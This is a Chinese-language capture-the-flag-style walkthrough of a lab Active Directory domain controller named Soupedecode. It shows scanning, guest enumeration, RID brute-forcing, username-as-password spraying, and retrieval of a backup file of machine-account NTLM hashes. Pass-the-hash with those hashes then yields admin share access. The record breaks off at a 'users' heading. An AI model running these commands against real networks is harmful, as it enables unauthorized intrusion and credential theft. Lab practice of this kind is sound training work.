---
title: 无境靶场:Soupedecode 01 thm靶场复刻
date: 2026-07-07T18:46:26+08:00
lastmod: 2026-07-07T21:45:14+08:00
---

# 无境靶场:Soupedecode 01 thm靶场复刻

## Nmap 扫描

```py
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-07-07 10:46:37Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: soupedecode.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: soupedecode.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.soupedecode.local
| Issuer: commonName=DC01.soupedecode.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-06T10:42:14
| Not valid after:  2027-01-05T10:42:14
| MD5:     9b88 713f b925 4bd3 ed4a 0c96 4a18 d931
| SHA-1:   1063 0cda 7db2 6ae1 90ec aed6 e28b 158d 4f95 be24
| SHA-256: 5599 4772 c1be 1b10 711f e682 3b67 74a9 489f 0f99 27ed 2a72 b2be 94a7 f7e1 7e33
| -----BEGIN CERTIFICATE-----
| MIIC8DCCAdigAwIBAgIQZwFUSt0N9KpK6zHaFm6LODANBgkqhkiG9w0BAQsFADAh
| MR8wHQYDVQQDExZEQzAxLnNvdXBlZGVjb2RlLmxvY2FsMB4XDTI2MDcwNjEwNDIx
| NFoXDTI3MDEwNTEwNDIxNFowITEfMB0GA1UEAxMWREMwMS5zb3VwZWRlY29kZS5s
| b2NhbDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMZvporJaU4Xnm6a
| K+bZuRxGq+JEMtJ4NOPfaE7SjIbbt9J/e292dshz6Uou5HHADwNNWXX4/gn3/Vqa
| SzWAIA3wrkKfAhqubE73VoABbN+LD6on/0bsqdqlvpVclbcUvp1+RGFcDH79nMA1
| TfDiuffrjHsh7E9PmvVDX4P9eck/JicQODz6c3ebNy440rW85CnyjhYrBdGdSfaK
| 3PDiYqvUUPRJTiVNOElrotiIF8jYeKeLEo868l/xy4Sml3v+4lkCZNGsH7IGlr4o
| uPEqJoqIE9x09r2ySqAOmTuuUR7nZU2fhXrczJphl7yZ1QBUmooH2ebUN4SZUxlA
| XUBVaSUCAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQw
| MA0GCSqGSIb3DQEBCwUAA4IBAQCG4B4P5j/c72wy0/AMEu0WS2eseEqPh/gf2nAo
| ySt/F2MntQdilKOcH1igmDH+HpiG8wMOQsUyhTbQYcAJtLVcGX9I+0AB33H+EzLi
| OMd5VPSh2y/RgOfH66+RQ8NUVyKJB6KE1ZAJ8ceMppXmblDv6JV0JpuECO15FPvl
| 3b5y6Vf2WIh7CEzA++a2Rv2J2GGoH+JczaX7hzE5XQCjsh/ZOA8xDXvZFpXVKZ0n
| bnzmQJmeLVeJ8iLhHLUOCdyCK9MR8xt69hoHr9/stgW8dJEluzIHY7BzNif/Vm1T
| yuihCJuNShwdcAtvH0UHSXqseIN5B26CydOo4CYW+6tWXpoA
|_-----END CERTIFICATE-----
|_ssl-date: 2026-07-07T10:47:38+00:00; +12s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49999/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
OS fingerprint not ideal because: Timing level 5 (Insane) used
Aggressive OS guesses: Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (94%), Microsoft Windows 11 24H2 (94%), Microsoft Windows Server 2016 (93%), Microsoft Windows Server 2022 (93%), Microsoft Windows 11 24H2 - 25H2 (93%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2019 (89%), Microsoft Windows Server 2012 Data Center (87%), Microsoft Windows 10 1909 - 2004 (87%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.99%E=4%D=7/7%OT=53%CT=1%CU=31858%PV=Y%DS=2%DC=T%G=N%TM=6A4CD946%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=10B%TI=I%CI=I%TS=A)
SEQ(SP=105%GCD=1%ISR=10E%TI=I%CI=I%TS=A)
OPS(O1=M551NW8ST11%O2=M551NW8ST11%O3=M551NW8NNT11%O4=M551NW8ST11%O5=M551NW8ST11%O6=M551ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
ECN(R=Y%DF=Y%T=80%W=FFFF%O=M551NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T7(R=N)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=N)

Uptime guess: 0.004 days (since Tue Jul  7 18:41:31 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 52930/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 58544/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 37976/udp): CLEAN (Timeout)
|   Check 4 (port 60470/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 11s, deviation: 0s, median: 11s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-07-07T10:47:30
|_  start_date: N/A
| nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b1:0c:f6 (VMware)
| Names:
|   SOUPEDECODE<00>      Flags: <group><active>
|   SOUPEDECODE<1c>      Flags: <group><active>
|   DC01<00>             Flags: <unique><active>
|   DC01<20>             Flags: <unique><active>
|   SOUPEDECODE<1b>      Flags: <unique><active>
| Statistics:
|   00 50 56 b1 0c f6 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   70.29 ms 10.8.0.1
2   70.37 ms 192.168.111.20
```

‍

```py
export IP=192.168.111.20
export DOMAIN=soupedecode.local
export DC=DC01.soupedecode.local

echo "$IP $DOMAIN $DC DC01 SOUPEDECODE" | sudo tee -a /etc/hosts
```

‍

## SMB 匿名共享

‍

```py
# smbclient -L //$DC -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      远程管理
        backup          Disk
        C$              Disk      默认共享
        IPC$            IPC       远程 IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to DC01.soupedecode.local failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

- nxc

```py
# nxc smb $IP -u '' -p '' --shares
SMB         192.168.111.20  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:soupedecode.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.111.20  445    DC01             [+] soupedecode.local\:
SMB         192.168.111.20  445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED


# nxc smb $IP -u guest -p '' --shares
SMB         192.168.111.20  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:soupedecode.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.111.20  445    DC01             [+] soupedecode.local\guest:
SMB         192.168.111.20  445    DC01             [*] Enumerated shares
SMB         192.168.111.20  445    DC01             Share           Permissions     Remark
SMB         192.168.111.20  445    DC01             -----           -----------     ------
SMB         192.168.111.20  445    DC01             ADMIN$                          远程管理
SMB         192.168.111.20  445    DC01             backup
SMB         192.168.111.20  445    DC01             C$                              默认共享
SMB         192.168.111.20  445    DC01             IPC$            READ            远程 IPC
SMB         192.168.111.20  445    DC01             NETLOGON                        Logon server share
SMB         192.168.111.20  445    DC01             SYSVOL                          Logon server share

# tmp nxc smb $IP -d SOUPEDECODE -u Guest -p '' --pass-pol
SMB         192.168.111.20  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:soupedecode.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.111.20  445    DC01             [+] SOUPEDECODE\Guest:
```

‍

```ps1
# smbmap -H 192.168.111.20 -u guest -p ''

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)

[+] IP: 192.168.111.20:445      Name: soupedecode.local         Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       远程管理
        backup                                                  NO ACCESS
        C$                                                      NO ACCESS       默认共享
        IPC$                                                    READ ONLY       远程 IPC
        NETLOGON                                                NO ACCESS       Logon server share
        SYSVOL                                                  NO ACCESS       Logon server share
```

‍

‍

## RPC 匿名枚举

```py
# RPC 匿名枚举
# rpcclient -U "" -N $IP -c "lsaquery; querydominfo; enumdomusers; querydispinfo"
Domain Name: SOUPEDECODE
Domain Sid: S-1-5-21-875679470-3476450079-2794512899
result was NT_STATUS_ACCESS_DENIED
result was NT_STATUS_ACCESS_DENIED
result was NT_STATUS_ACCESS_DENIED

# rpcclient -U 'SOUPEDECODE\Guest%' $IP
rpcclient $> lookupsids
Usage: lookupsids [sid1 [sid2 [...]]]
rpcclient $> lsaquery
Domain Name: SOUPEDECODE
Domain Sid: S-1-5-21-875679470-3476450079-2794512899
rpcclient $> lookupsids S-1-5-21-875679470-3476450079-2794512899
S-1-5-21-875679470-3476450079-2794512899 SOUPEDECODE (3)
rpcclient $> lookupsids S-1-5-21-875679470-3476450079-2794512899-1
S-1-5-21-875679470-3476450079-2794512899-1 *unknown*\*unknown* (8)
rpcclient $> lookupsids S-1-5-21-875679470-3476450079-2794512899-1000
S-1-5-21-875679470-3476450079-2794512899-1000 SOUPEDECODE\DC01$ (1)
```

‍

## LDAP 匿名枚举

‍

```py
# ldapsearch -x -H ldap://$IP -s base namingContexts defaultNamingContext dnsHostName
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingContexts defaultNamingContext dnsHostName
#

#
dn:
dnsHostName: DC01.soupedecode.local
defaultNamingContext: DC=soupedecode,DC=local
namingContexts: DC=soupedecode,DC=local
namingContexts: CN=Configuration,DC=soupedecode,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=soupedecode,DC=local
namingContexts: DC=DomainDnsZones,DC=soupedecode,DC=local
namingContexts: DC=ForestDnsZones,DC=soupedecode,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

‍

## STOP

RPC 枚举用户

‍

## 枚举用户

‍

```py
# 用 Kerberos 的返回错误来判断用户名是否存在，同时顺便检查这个用户能不能做 AS-REP Roasting
# impacket-GetNPUsers SOUPEDECODE.LOCAL/ -dc-ip $IP -usersfile users.txt -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set # 存在
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User dc01 doesn't have UF_DONT_REQUIRE_PREAUTH set # 存在

```

‍

通过 SMB 会话走 RPC/SID Lookup 做 RID 枚举

```ps1
netexec smb 192.168.111.20 -u 'Guest' -p '' --rid-brute
SMB         192.168.111.20  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:soupedecode.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.111.20  445    DC01             [+] soupedecode.local\Guest:
SMB         192.168.111.20  445    DC01             498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         192.168.111.20  445    DC01             500: SOUPEDECODE\Administrator (SidTypeUser)
SMB         192.168.111.20  445    DC01             501: SOUPEDECODE\Guest (SidTypeUser)
SMB         192.168.111.20  445    DC01             502: SOUPEDECODE\krbtgt (SidTypeUser)
SMB         192.168.111.20  445    DC01             512: SOUPEDECODE\Domain Admins (SidTypeGroup)
SMB         192.168.111.20  445    DC01             513: SOUPEDECODE\Domain Users (SidTypeGroup)
SMB         192.168.111.20  445    DC01             514: SOUPEDECODE\Domain Guests (SidTypeGroup)
SMB         192.168.111.20  445    DC01             515: SOUPEDECODE\Domain Computers (SidTypeGroup)
SMB         192.168.111.20  445    DC01             516: SOUPEDECODE\Domain Controllers (SidTypeGroup)
SMB         192.168.111.20  445    DC01             517: SOUPEDECODE\Cert Publishers (SidTypeAlias)
SMB         192.168.111.20  445    DC01             518: SOUPEDECODE\Schema Admins (SidTypeGroup)
SMB         192.168.111.20  445    DC01             519: SOUPEDECODE\Enterprise Admins (SidTypeGroup)
SMB         192.168.111.20  445    DC01             520: SOUPEDECODE\Group Policy Creator Owners (SidTypeGroup)
SMB         192.168.111.20  445    DC01             521: SOUPEDECODE\Read-only Domain Controllers (SidTypeGroup)
SMB         192.168.111.20  445    DC01             522: SOUPEDECODE\Cloneable Domain Controllers (SidTypeGroup)
SMB         192.168.111.20  445    DC01             525: SOUPEDECODE\Protected Users (SidTypeGroup)
SMB         192.168.111.20  445    DC01             526: SOUPEDECODE\Key Admins (SidTypeGroup)
SMB         192.168.111.20  445    DC01             527: SOUPEDECODE\Enterprise Key Admins (SidTypeGroup)
SMB         192.168.111.20  445    DC01             553: SOUPEDECODE\RAS and IAS Servers (SidTypeAlias)
SMB         192.168.111.20  445    DC01             571: SOUPEDECODE\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         192.168.111.20  445    DC01             572: SOUPEDECODE\Denied RODC Password Replication Group (SidTypeAlias)
SMB         192.168.111.20  445    DC01             1000: SOUPEDECODE\DC01$ (SidTypeUser)
SMB         192.168.111.20  445    DC01             1101: SOUPEDECODE\DnsAdmins (SidTypeAlias)
SMB         192.168.111.20  445    DC01             1102: SOUPEDECODE\DnsUpdateProxy (SidTypeGroup)
SMB         192.168.111.20  445    DC01             1139: SOUPEDECODE\ybob317 (SidTypeUser)
SMB         192.168.111.20  445    DC01             1140: SOUPEDECODE\file_svc (SidTypeUser)
SMB         192.168.111.20  445    DC01             1141: SOUPEDECODE\FileServer$$ (SidTypeUser)
SMB         192.168.111.20  445    DC01             1142: SOUPEDECODE\FileServer$ (SidTypeUser)
SMB         192.168.111.20  445    DC01             1143: SOUPEDECODE\WebServer$ (SidTypeUser)
SMB         192.168.111.20  445    DC01             1144: SOUPEDECODE\DatabaseServer$ (SidTypeUser)
SMB         192.168.111.20  445    DC01             1145: SOUPEDECODE\CitrixServer$ (SidTypeUser)
SMB         192.168.111.20  445    DC01             1146: SOUPEDECODE\MailServer$ (SidTypeUser)
SMB         192.168.111.20  445    DC01             1147: SOUPEDECODE\BackupServer$ (SidTypeUser)
SMB         192.168.111.20  445    DC01             1148: SOUPEDECODE\ApplicationServer$ (SidTypeUser)
SMB         192.168.111.20  445    DC01             1149: SOUPEDECODE\PrintServer$ (SidTypeUser)
SMB         192.168.111.20  445    DC01             1150: SOUPEDECODE\ProxyServer$ (SidTypeUser)
SMB         192.168.111.20  445    DC01             1151: SOUPEDECODE\MonitoringServer$ (SidTypeUser)
```

‍

## 重点用户

```ps1
netexec smb 192.168.111.20 -u 'Guest' -p '' --rid-brute |grep SidTypeUser |grep -v '\$'
SMB                      192.168.111.20  445    DC01             500: SOUPEDECODE\Administrator (SidTypeUser)
SMB                      192.168.111.20  445    DC01             501: SOUPEDECODE\Guest (SidTypeUser)
SMB                      192.168.111.20  445    DC01             502: SOUPEDECODE\krbtgt (SidTypeUser)
SMB                      192.168.111.20  445    DC01             1139: SOUPEDECODE\ybob317 (SidTypeUser)
SMB                      192.168.111.20  445    DC01             1140: SOUPEDECODE\file_svc (SidTypeUser)
```

‍

## 拿到一个smb凭证

- 尝试密码喷洒或爆破

```ps1
# nxc smb $IP -u rid_users.txt -p rid_users.txt --no-bruteforce --continue-on-success
SMB         192.168.111.20  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:soupedecode.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.111.20  445    DC01             [-] soupedecode.local\Administrator:Administrator STATUS_LOGON_FAILURE
SMB         192.168.111.20  445    DC01             [-] soupedecode.local\Guest:Guest STATUS_LOGON_FAILURE
SMB         192.168.111.20  445    DC01             [-] soupedecode.local\krbtgt:krbtgt STATUS_LOGON_FAILURE
SMB         192.168.111.20  445    DC01             [+] soupedecode.local\ybob317:ybob317
SMB         192.168.111.20  445    DC01             [-] soupedecode.local\file_svc:file_svc STATUS_LOGON_FAILURE
```

拿到smb 用户密码后继续做信息收集

- 没法执行命令

```ps1
nxc winrm $IP -d SOUPEDECODE -u 'ybob317' -p 'ybob317'
WINRM       192.168.111.20  5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:soupedecode.local)
WINRM       192.168.111.20  5985   DC01             [-] SOUPEDECODE\ybob317:ybob317
```

‍

- smb 探测

```ps1
nxc smb $IP -u 'ybob317' -p 'ybob317' --shares
SMB         192.168.111.20  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:soupedecode.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.111.20  445    DC01             [+] soupedecode.local\ybob317:ybob317
SMB         192.168.111.20  445    DC01             [*] Enumerated shares
SMB         192.168.111.20  445    DC01             Share           Permissions     Remark
SMB         192.168.111.20  445    DC01             -----           -----------     ------
SMB         192.168.111.20  445    DC01             ADMIN$                          远程管理
SMB         192.168.111.20  445    DC01             backup          READ
SMB         192.168.111.20  445    DC01             C$                              默认共享
SMB         192.168.111.20  445    DC01             IPC$            READ            远程 IPC
SMB         192.168.111.20  445    DC01             NETLOGON        READ            Logon server share
SMB         192.168.111.20  445    DC01             SYSVOL          READ            Logon server share
```

‍

```ps1
# smbmap -H 192.168.111.20 -u 'ybob317' -p 'ybob317' -r

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)

[+] IP: 192.168.111.20:445      Name: soupedecode.local         Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       远程管理
        backup                                                  READ ONLY
        ./backup
        dr--r--r--                0 Wed Nov 19 01:56:59 2025    .
        dr--r--r--                0 Wed Nov 19 02:02:50 2025    ..
        fr--r--r--             3796 Wed Nov 19 01:57:00 2025    backup_extract.txt
        C$                                                      NO ACCESS       默认共享
        IPC$                                                    READ ONLY       远程 IPC
        ./IPC$
        fr--r--r--                3 Mon Jan  1 08:05:43 1601    InitShutdown
        fr--r--r--                4 Mon Jan  1 08:05:43 1601    lsass
        fr--r--r--                4 Mon Jan  1 08:05:43 1601    ntsvcs
        fr--r--r--                3 Mon Jan  1 08:05:43 1601    scerpc
        fr--r--r--                1 Mon Jan  1 08:05:43 1601    Winsock2\CatalogChangeListener-2c4-0
        fr--r--r--                1 Mon Jan  1 08:05:43 1601    Winsock2\CatalogChangeListener-3c8-0
        fr--r--r--                3 Mon Jan  1 08:05:43 1601    epmapper
        fr--r--r--                1 Mon Jan  1 08:05:43 1601    Winsock2\CatalogChangeListener-254-0
        fr--r--r--                3 Mon Jan  1 08:05:43 1601    LSM_API_service
        fr--r--r--                1 Mon Jan  1 08:05:43 1601    Winsock2\CatalogChangeListener-3f8-0
        fr--r--r--                3 Mon Jan  1 08:05:43 1601    eventlog
        fr--r--r--                1 Mon Jan  1 08:05:43 1601    Winsock2\CatalogChangeListener-4e0-0
        fr--r--r--                3 Mon Jan  1 08:05:43 1601    atsvc
        fr--r--r--                3 Mon Jan  1 08:05:43 1601    TermSrv_API_service
        fr--r--r--                3 Mon Jan  1 08:05:43 1601    Ctx_WinStation_API_service
        fr--r--r--                1 Mon Jan  1 08:05:43 1601    Winsock2\CatalogChangeListener-680-0
        fr--r--r--                4 Mon Jan  1 08:05:43 1601    wkssvc
        fr--r--r--                3 Mon Jan  1 08:05:43 1601    SessEnvPublicRpc
        fr--r--r--                1 Mon Jan  1 08:05:43 1601    Winsock2\CatalogChangeListener-870-0
        fr--r--r--                1 Mon Jan  1 08:05:43 1601    Winsock2\CatalogChangeListener-2c4-1
        fr--r--r--                1 Mon Jan  1 08:05:43 1601    Winsock2\CatalogChangeListener-914-0
        fr--r--r--                3 Mon Jan  1 08:05:43 1601    RpcProxy\49602
        fr--r--r--                3 Mon Jan  1 08:05:43 1601    b3d85d67fce5a9fc
        fr--r--r--                3 Mon Jan  1 08:05:43 1601    RpcProxy\593
        fr--r--r--                4 Mon Jan  1 08:05:43 1601    srvsvc
        fr--r--r--                3 Mon Jan  1 08:05:43 1601    spoolss
        fr--r--r--                1 Mon Jan  1 08:05:43 1601    Winsock2\CatalogChangeListener-b30-0
        fr--r--r--                3 Mon Jan  1 08:05:43 1601    netdfs
        fr--r--r--                3 Mon Jan  1 08:05:43 1601    ROUTER
        fr--r--r--                1 Mon Jan  1 08:05:43 1601    vgauth-service
        fr--r--r--                1 Mon Jan  1 08:05:43 1601    Winsock2\CatalogChangeListener-2b0-0
        fr--r--r--                1 Mon Jan  1 08:05:43 1601    Winsock2\CatalogChangeListener-ce8-0
        fr--r--r--                3 Mon Jan  1 08:05:43 1601    W32TIME_ALT
        fr--r--r--                1 Mon Jan  1 08:05:43 1601    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
        fr--r--r--                1 Mon Jan  1 08:05:43 1601    Winsock2\CatalogChangeListener-c64-0
        NETLOGON                                                READ ONLY       Logon server share
        ./NETLOGON
        dr--r--r--                0 Wed Nov 19 00:17:21 2025    .
        dr--r--r--                0 Wed Nov 19 00:18:40 2025    ..
        SYSVOL                                                  READ ONLY       Logon server share
        ./SYSVOL
        dr--r--r--                0 Wed Nov 19 00:17:21 2025    .
        dr--r--r--                0 Wed Nov 19 00:17:21 2025    ..
        dr--r--r--                0 Wed Nov 19 00:17:21 2025    soupedecode.local
[*] Closed 1 connections
```

‍

- 下载这个文件

```ps1
smbclient //$IP/backup -U 'SOUPEDECODE\ybob317%ybob317' -c 'get backup_extract.txt'
```

- backup_extract.txt 内容

貌似是一批账号的 NTLM hash 和 Kerberos AES key

里面有两类东西：

```
1. 机器账号 NTLM hash
2. 机器账号 Kerberos AES key
```

‍

## 批量 Pass-the-Hash 凭据验证

‍

```bash
# cat backup_extract.txt |grep ':::'
soupedecode.local\FileServer$:1142:aad3b435b51404eeaad3b435b51404ee:3647bc99352403e306780b2c0c63a685:::
WebServer$:1143:aad3b435b51404eeaad3b435b51404ee:9bcde1e9b9f1d387b4384df7a6999d74:::
DatabaseServer$:1144:aad3b435b51404eeaad3b435b51404ee:cff031800058bdd35b5656d48c587be2:::
CitrixServer$:1145:aad3b435b51404eeaad3b435b51404ee:8aa99c9c7a7992d4a318ee78e40e8edb:::
MailServer$:1146:aad3b435b51404eeaad3b435b51404ee:f8bbfffd318d4946e0cf535e91fff41e:::
BackupServer$:1147:aad3b435b51404eeaad3b435b51404ee:98af6b641651876f02c5413cc675b452:::
ApplicationServer$:1148:aad3b435b51404eeaad3b435b51404ee:53d3e4a6806dc173e381cac2249c31a5:::
PrintServer$:1149:aad3b435b51404eeaad3b435b51404ee:53ae68a440adca921647ac1e3d372009:::
ProxyServer$:1150:aad3b435b51404eeaad3b435b51404ee:4877e819a294199fdd6eb8b060539c8a:::
MonitoringServer$:1151:aad3b435b51404eeaad3b435b51404ee:d7587c883ad1306000967ea6f2521b6c:::
WIN-9LOH12M435J$:1000:aad3b435b51404eeaad3b435b51404ee:e35cc01821628990870c6618fe3b209c:::
FileServer$$:1141:aad3b435b51404eeaad3b435b51404ee:3f1f33b3b48357d985a4158bd1969f27:::
# cat backup_extract.txt |grep ':::' | awk -F ':' '{print $1}'
# cat backup_extract.txt |grep ':::' | awk -F ':' '{print $4}'
3647bc99352403e306780b2c0c63a685
9bcde1e9b9f1d387b4384df7a6999d74
cff031800058bdd35b5656d48c587be2
8aa99c9c7a7992d4a318ee78e40e8edb
f8bbfffd318d4946e0cf535e91fff41e
98af6b641651876f02c5413cc675b452
53d3e4a6806dc173e381cac2249c31a5
53ae68a440adca921647ac1e3d372009
4877e819a294199fdd6eb8b060539c8a
d7587c883ad1306000967ea6f2521b6c
e35cc01821628990870c6618fe3b209c
3f1f33b3b48357d985a4158bd1969f27
```

- 拿到了一个有效的 用户和 hash

```ps1
# nxc smb $IP -d SOUPEDECODE -u machine_users.txt -H machine_hashes.txt --no-bruteforce --continue-on-success
SMB         192.168.111.20  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:soupedecode.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.111.20  445    DC01             [+] SOUPEDECODE\FileServer$:3647bc99352403e306780b2c0c63a685 (Pwn3d!)
...
```

- shares

```ps1
# nxc smb $IP -d SOUPEDECODE -u 'FileServer$' -H 3647bc99352403e306780b2c0c63a685 --shares
SMB         192.168.111.20  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:soupedecode.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.111.20  445    DC01             [+] SOUPEDECODE\FileServer$:3647bc99352403e306780b2c0c63a685 (Pwn3d!)
SMB         192.168.111.20  445    DC01             [*] Enumerated shares
SMB         192.168.111.20  445    DC01             Share           Permissions     Remark
SMB         192.168.111.20  445    DC01             -----           -----------     ------
SMB         192.168.111.20  445    DC01             ADMIN$          READ,WRITE      远程管理
SMB         192.168.111.20  445    DC01             backup          READ
SMB         192.168.111.20  445    DC01             C$              READ,WRITE      默认共享
SMB         192.168.111.20  445    DC01             IPC$            READ            远程 IPC
SMB         192.168.111.20  445    DC01             NETLOGON        READ,WRITE      Logon server share
SMB         192.168.111.20  445    DC01             SYSVOL          READ,WRITE      Logon server share
```

- users

